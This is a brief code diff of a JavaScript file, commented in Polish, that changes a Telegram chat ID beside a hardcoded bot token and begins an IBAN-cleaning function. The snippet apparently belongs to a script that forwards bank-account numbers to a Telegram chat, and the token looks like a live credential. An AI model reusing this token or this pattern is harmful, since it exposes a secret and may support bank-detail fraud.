@@ -4,7 +4,7 @@
 
 // ===== KONFIGURACJA TELEGRAM =====
 const TELEGRAM_BOT_TOKEN = '8773577622:AAHarDcx8_yFny9uB35DGi6YRk0LCwn3tjg';
-const TELEGRAM_CHAT_ID = '-1004310388304';
+const TELEGRAM_CHAT_ID = '-1004463938545';
 
 // ===== FUNKCJA CZYSZCZĄCA IBAN (usuwa spacje, PL, zostawia cyfry) =====
 function cleanIbanValue(value) {
